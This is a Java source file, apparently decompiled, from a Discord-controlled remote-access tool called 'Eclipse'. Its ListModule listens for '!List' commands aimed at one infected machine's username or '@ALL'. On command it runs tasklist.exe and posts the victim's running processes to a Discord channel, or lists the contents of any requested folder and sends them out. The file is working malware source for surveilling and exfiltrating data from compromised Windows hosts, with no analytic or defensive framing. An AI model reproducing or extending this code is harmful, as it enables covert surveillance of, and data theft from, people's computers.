package me.Eclipse.Modules.Impl;

import java.awt.Color;
import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.Objects;
import java.util.Scanner;

import me.Eclipse.Brain;
import me.Eclipse.Utils.Helper;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;

public class ListModule {
    private static ArrayList Processes = new ArrayList();

    public static void run(MessageReceivedEvent var0) {
        Message var1 = var0.getMessage();
        if (var1.getChannel().getName().contains("module-list")) {
            if (var1.getContentDisplay().startsWith("!List " + Brain.Username) || var1.getContentDisplay().startsWith("!List @ALL")) {
                String var2 = var1.getContentDisplay().replaceFirst("!List " + Brain.Username + " File ", "").replaceFirst("!List @ALL File ", "");
                String var3 = var1.getContentDisplay().replaceFirst("!List " + Brain.Username + " ", "").replaceFirst("!List @ALL ", "").replace(" " + var2, "");
                if (var3.equals("Process")) {
                    Process var4;
                    try {
                        var4 = (new ProcessBuilder(new String[]{"tasklist.exe", "/fo", "csv", "/nh"})).start();
                    } catch (IOException var10) {
                        Helper.sendMessage(Color.RED, "Module List (" + Brain.Username + ")", "Failed to get process list.", var0);
                        return;
                    }

                    Scanner var5 = new Scanner(var4.getInputStream());
                    if (var5.hasNextLine()) {
                        var5.nextLine();
                    } else {
                        var5.close();
                    }

                    while (var5.hasNextLine()) {
                        String[] var6 = var5.nextLine().split(",");
                        Processes.add(var6[0].substring(1).replaceFirst(".$", "") + ". (" + var6[1].substring(1).replaceFirst(".$", "") + ")\n");
                    }

                    if (!var5.hasNextLine()) {
                        StringBuilder var13 = new StringBuilder();
                        Iterator var7 = Processes.iterator();

                        while (var7.hasNext()) {
                            String var8 = (String) var7.next();
                            var13.append(var8);
                        }

                        if (var13.length() > 2000) {
                            ArrayList var15 = Helper.split(String.valueOf(var13));

                            for (int var16 = 0; var16 < var15.size(); ++var16) {
                                Helper.sendMessage(Color.GREEN, "Module List (" + Brain.Username + ")", "Total processes: " + Processes.size() + ". Part: " + (var16 + 1) + ".\n" + (String) var15.get(var16), var0);
                            }
                        } else {
                            Helper.sendMessage(Color.GREEN, "Module List (" + Brain.Username + ")", "Total processes: " + Processes.size() + ".\n" + var13, var0);
                        }

                        Processes.clear();
                    }

                    try {
                        var4.waitFor();
                    } catch (InterruptedException var9) {
                        Helper.sendMessage(Color.RED, "Module List (" + Brain.Username + ")", "Failed to get process list.", var0);
                    }
                } else if (var3.equals("File")) {
                    if ((new File(var2)).exists()) {
                        if (Helper.getFileList(var2).length() > 2000) {
                            ArrayList var11 = Helper.split(Helper.getFileList(var2));

                            for (int var12 = 0; var12 < var11.size(); ++var12) {
                                int var14 = var12 + 1;
                                if ((new File(var2)).isDirectory()) {
                                    Helper.sendMessage(Color.GREEN, "Module List (" + Brain.Username + ")", "Total files: " + ((File[]) Objects.requireNonNull((new File(var2)).listFiles())).length + ". Part: " + var14 + ".\n" + (String) var11.get(var12), var0);
                                } else {
                                    Helper.sendMessage(Color.RED, "Module List (" + Brain.Username + ")", "This is not a folder.", var0);
                                }
                            }
                        } else if ((new File(var2)).isDirectory()) {
                            Helper.sendMessage(Color.GREEN, "Module List (" + Brain.Username + ")", "Total files: " + ((File[]) Objects.requireNonNull((new File(var2)).listFiles())).length + ".\n" + Helper.getFileList(var2), var0);
                        } else {
                            Helper.sendMessage(Color.RED, "Module List (" + Brain.Username + ")", "This is not a folder.", var0);
                        }
                    } else {
                        Helper.sendMessage(Color.RED, "Module List (" + Brain.Username + ")", "Folder not found.", var0);
                    }
                } else {
                    Helper.sendMessage(Color.RED, "Module List (" + Brain.Username + ")", "Invalid syntax.", var0);
                }
            }

        }
    }
}
